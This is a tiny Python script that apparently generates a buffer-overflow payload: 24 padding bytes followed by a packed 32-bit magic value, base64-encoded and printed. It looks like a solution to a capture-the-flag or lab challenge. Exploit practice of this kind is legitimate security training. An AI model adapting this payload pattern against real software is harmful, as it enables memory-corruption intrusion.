
import sys
import struct
import base64

buf = b'XXXXXXXXXXXXXXXXXXXXXXXX'
buf += struct.pack('<I', 3618316269)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
